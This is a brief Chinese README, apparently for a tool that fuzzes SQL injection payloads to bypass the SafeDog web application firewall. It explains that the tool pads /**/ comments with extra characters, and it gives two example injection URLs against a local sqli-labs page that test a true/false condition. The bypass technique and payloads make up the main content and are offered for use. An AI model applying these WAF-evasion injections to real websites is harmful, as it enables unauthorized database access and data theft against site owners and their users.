# bypass
安全狗bypass

sqlifuzz.txt 文件内容
主要是在注释符/**/ 中添加其他字符，用来绕过安全狗waf

使用 
```
http://192.168.0.101/Less-1/?id=1' and/*/!/%%%*/1=1 -- - 
http://192.168.0.101/Less-1/?id=1' and/*/!/%%%*/1=2 -- -
```
参考文章：

```
https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/
https://blog.csdn.net/qq_36618918/article/details/129265271
```
